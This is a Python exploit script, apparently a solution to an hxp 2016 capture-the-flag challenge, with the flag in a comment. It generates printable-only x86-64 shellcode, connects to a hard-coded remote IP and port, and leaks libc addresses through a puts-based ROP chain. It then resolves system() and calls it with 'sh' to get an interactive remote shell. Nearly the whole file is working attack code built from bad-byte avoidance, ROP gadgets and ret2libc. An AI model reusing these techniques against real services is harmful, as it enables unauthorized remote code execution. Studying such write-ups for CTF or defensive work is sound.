from pwnlib import *
import random
from pwnlib import assemble as do_assemble
import sys

import dynelf
import memleak

# hxp{Pr1nT4bL3_sh3LLc0d3z_4r3_5tiLl_PHuN_iN_2016}


DEBUG = len(sys.argv) <= 1
#DEBUG = False

LOCAL = False

puts_got = 0x600fd0

def is_bad(chars):
	return any(c in r'\"' or ord(c) not in range(0x20, 0x7f) for c in chars)


def assemble(lines):
	result = ""
	for line in lines.split("\n"):
		line = line.strip()
		bytecode = do_assemble(line)

		if DEBUG:
			bad = ("\033[91m <----~~~~~ BAD BAD BAD \033[0m" if
						is_bad(bytecode) else "")
			print bytecode.encode("hex").ljust(16, " "), line, bad

		if line == "":
			continue

		rem = len(result) % 8
		assert rem <= 6
		if len(bytecode) + rem > 6:
			result += "\x40"*(6 - rem)
			result += "\x4d\x69"
			assert (len(result) % 8) == 0
		if len(bytecode) > 6:
			print "the bytecode is too long:", len(bytecode)
			exit(1)
		assert len(bytecode) <= 6
		result += bytecode

	
	return result


def make_xors(target):
	while True:
		value1 = random.randint(0x20202020, 0x7e7e7e7e)
		value2 = random.randint(0x20202020, 0x7e7e7e7e)
		xor = ((target ^ value1) + value2) % (1<<32)
		if any(is_bad(pd(x)) for x in [value1, value2, xor]):
			continue
		return value1, value2, xor



def make_payload():

	stack_addr = 0x601df0

	gets_offset = -(-0x1000 + 0x6d0)

	puts_pieces = make_xors(puts_got - 0x20)
	adjust_pieces = make_xors(gets_offset)

	payload = assemble(("""

; it's useful to have a zero register
; but we assume r15 is zero.

;;;;;; prepare adjustment of address

push 0x%x
pop rax
sub rax, 0x%x
xor rax, 0x%x

push rax
push rax
push rax
push rax
push rax

; now it's under [rsp+0x20]

;;;;;; fix up rdi

push rsp
pop rdi

;;;;;; get the address of puts@got 
; [sp] <- puts@got
push 0x%x
pop rax
sub rax, 0x%x
xor rax, 0x%x

push rax
pop rbx


push r15
pop rax
xor rax, [rbx + 0x20]
sub rax, [rsp + 0x20]

push rax 

; rop gadget for later.. 
push rdi 
pop rdi

;;;;;; jump forward into ret now

; jumps
db 0x79
db 0x6b
db 0x78
db 0x69

; "sh;"
db 0x73
db 0x68
db 0x3b




	""") % (
		adjust_pieces[2], adjust_pieces[1], adjust_pieces[0],
		puts_pieces[2], puts_pieces[1], puts_pieces[0],
	))

	LIMIT = 0x77
	#payload = payload[:LIMIT]

	if DEBUG:
		print "length: %d / %d" % (len(payload), LIMIT)

	payload += "A"*(LIMIT - len(payload))

	assert len(payload) <= LIMIT, len(payload)
	return payload




if __name__ == "__main__":
	name = make_payload()
	addr = 0x40063f

	if LOCAL:
		print name
		print "%d\n" % addr
		exit()

	s = Socket(("104.197.131.38", 37008))

	s.send(name + "\n")
	s.send("%d\n" % addr)

	s.ru(".\x1b[0m\n")


	pop_rdi = 0x4006da
	puts_plt = 0x400510

	target = 0x4007f8

	def leak(target):
		print "target: 0x%x" % target

		payload = ""

		payload += pq(pop_rdi)
		payload += pq(target)
		payload += pq(puts_plt)
		payload += pq(pop_rdi)
		payload += pq(0x400000)
		payload += pq(puts_plt)
		payload += pq(addr)

		if "\n" in payload:
			return None

		assert "\n" not in payload

		s.send(payload + "\n")
		leaked = s.ru("7f454c460201010a".decode("hex"))[:-1] + "\x00"
		print "leaked ->", leaked.encode("hex")

		return leaked


	leaker = memleak.MemLeak(leak)
	libc_ptr = leaker.q(puts_got)

	de = dynelf.DynELF.from_lib_ptr(leaker, libc_ptr)
	system = de.lookup("system")

	print "got system:", system


	payload = ""
	payload += pq(pop_rdi)
	payload += pq(0x4006e7)
	payload += pq(system)

	assert "\n" not in payload

	s.send(payload + "\n")
	s.interact()



